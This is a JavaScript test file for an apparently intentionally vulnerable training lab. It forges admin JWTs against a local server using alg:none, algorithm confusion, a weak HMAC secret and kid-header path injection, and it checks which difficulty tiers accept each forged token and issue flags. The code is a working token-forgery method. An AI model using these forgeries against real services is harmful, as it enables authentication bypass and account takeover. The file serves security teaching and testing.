/**
 * tests/jwt-expert-tier.test.js — Phase 7 addition: genuine Expert-tier
 * content for the jwt-vulnerabilities lab (upgrade-spec Section 15's
 * fourth tier). This is the second lab to get real Expert content (after
 * ssrf) — see docs/UPGRADE-LOG.md for the pattern this follows.
 *
 * The technique: alg confusion (hard tier's bug) is fully closed at
 * expert, but key resolution now happens via the token's own "kid"
 * header, and an unrecognized kid falls through to being read as a path
 * into the same fake filesystem the path-traversal/LFI labs already use
 * — a real, documented JWT attack class. Builds real HMAC-SHA256 tokens
 * with Node's own crypto module (same honest-testing approach as every
 * other lab's tests — no shortcuts, no calling internal functions
 * directly) and sends them exactly as a browser/Burp would.
 */
const http = require("http");
const crypto = require("crypto");

let pass = 0, fail = 0;
function check(name, cond, extra) { if (cond) { pass++; console.log("PASS:", name); } else { fail++; console.log("FAIL:", name, extra || ""); } }
setTimeout(() => { console.log(`DEADLINE HIT: ${pass} passed, ${fail} failed (incomplete)`); process.exit(2); }, 30000).unref();

function b64url(buf) { return Buffer.from(buf).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, ""); }
function makeToken(header, payload, secret) {
  const h = b64url(JSON.stringify(header));
  const p = b64url(JSON.stringify(payload));
  if (secret === null) return `${h}.${p}.`; // alg:none case
  const sig = b64url(crypto.createHmac("sha256", secret).update(`${h}.${p}`).digest());
  return `${h}.${p}.${sig}`;
}
function get(urlPath) {
  return new Promise((resolve, reject) => {
    http.get(`http://localhost:3000${urlPath}`, (res) => {
      let body = "";
      res.on("data", (d) => (body += d));
      res.on("end", () => resolve({ status: res.statusCode, body }));
    }).on("error", reject);
  });
}
function callAdmin(difficulty, token) {
  return get(`/vuln/jwt-vulnerabilities/admin?difficulty=${difficulty}&token=${encodeURIComponent(token)}`);
}

const ADMIN_PAYLOAD = { user: "admin", role: "admin" };
const PUBLIC_KEY = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqDEMOFAKEPUBLICKEYDONOTUSE0523\n-----END PUBLIC KEY-----";
const VFS_FILE_CONTENT = "Welcome to SecureCorp Demo!"; // must match src/services/fake-filesystem.js exactly

async function run() {
  const rGuard = await get("/vuln/jwt-vulnerabilities?difficulty=expert");
  check("the guard lets expert through for jwt-vulnerabilities too (2nd lab enabled)", rGuard.status === 200);

  // --- alg:none is still blocked at expert -----------------------------
  const noneToken = makeToken({ alg: "none", typ: "JWT" }, ADMIN_PAYLOAD, null);
  const rNone = await callAdmin("expert", noneToken);
  check("expert: alg:none is rejected", /Rejected/.test(rNone.body));
  check("expert: alg:none rejection gives no flag", !/FLAG\{/.test(rNone.body));

  // --- hard tier's alg-confusion bug is fully closed at expert ---------
  const algConfusionToken = makeToken({ alg: "HS256", typ: "JWT" }, ADMIN_PAYLOAD, PUBLIC_KEY);
  const rAlgConfusion = await callAdmin("expert", algConfusionToken);
  check("expert: hard tier's public-key-as-HMAC-secret trick no longer works", /Rejected/.test(rAlgConfusion.body));
  check("expert: no flag leaks via the closed alg-confusion path", !/FLAG\{/.test(rAlgConfusion.body));

  // --- weak secret (medium tier's bug) doesn't work either --------------
  const weakSecretToken = makeToken({ alg: "HS256", typ: "JWT" }, ADMIN_PAYLOAD, "secret123");
  const rWeak = await callAdmin("expert", weakSecretToken);
  check("expert: medium tier's weak secret doesn't work either (only kid-resolved keys do)", /Rejected/.test(rWeak.body));

  // --- an unrecognized kid with no matching resolution is rejected -----
  const unknownKidToken = makeToken({ alg: "HS256", typ: "JWT", kid: "this-file-does-not-exist.txt" }, ADMIN_PAYLOAD, "anything");
  const rUnknownKid = await callAdmin("expert", unknownKidToken);
  check("expert: an unresolvable kid is rejected with a clear reason, not a crash", rUnknownKid.status === 200 && /no key found for kid/.test(rUnknownKid.body));

  // --- the real exploit: kid pointing at a fake-filesystem path --------
  const kidToken = makeToken({ alg: "HS256", typ: "JWT", kid: "/app/templates/en.txt" }, ADMIN_PAYLOAD, VFS_FILE_CONTENT);
  const rKid = await callAdmin("expert", kidToken);
  check("expert: kid-injection forged token is accepted as valid admin", /Welcome, admin/.test(rKid.body), rKid.body.slice(0, 300));
  const flagMatch = rKid.body.match(/FLAG\{jwt-vulnerabilities-expert-[a-f0-9]+\}/);
  check("expert: a real, correctly-tiered flag is issued", !!flagMatch);

  // --- a non-admin payload via the same technique correctly gets no flag ---
  const kidNonAdminToken = makeToken({ alg: "HS256", typ: "JWT", kid: "/app/templates/en.txt" }, { user: "guest", role: "user" }, VFS_FILE_CONTENT);
  const rKidNonAdmin = await callAdmin("expert", kidNonAdminToken);
  check("expert: kid-injection with a non-admin role is valid but yields no flag (role check still applies)", /not an admin/.test(rKidNonAdmin.body));

  // --- confirm the OTHER 3 tiers are completely unchanged by this work ---
  const easyNoneToken = makeToken({ alg: "none", typ: "JWT" }, ADMIN_PAYLOAD, null);
  const rEasy = await callAdmin("easy", easyNoneToken);
  check("easy tier: alg:none bypass still works exactly as before", /Welcome, admin/.test(rEasy.body) && /FLAG\{jwt-vulnerabilities-easy-/.test(rEasy.body));

  const mediumToken = makeToken({ alg: "HS256", typ: "JWT" }, ADMIN_PAYLOAD, "secret123");
  const rMedium = await callAdmin("medium", mediumToken);
  check("medium tier: weak-secret bypass still works exactly as before", /FLAG\{jwt-vulnerabilities-medium-/.test(rMedium.body));

  const hardToken = makeToken({ alg: "HS256", typ: "JWT" }, ADMIN_PAYLOAD, PUBLIC_KEY);
  const rHard = await callAdmin("hard", hardToken);
  check("hard tier: alg-confusion bypass still works exactly as before (unchanged by expert's fix)", /FLAG\{jwt-vulnerabilities-hard-/.test(rHard.body));

  console.log(`\n=== ${pass} passed, ${fail} failed ===`);
  process.exit(fail > 0 ? 1 : 0);
}

run().catch((e) => { console.error("ERROR:", e.message); process.exit(1); });
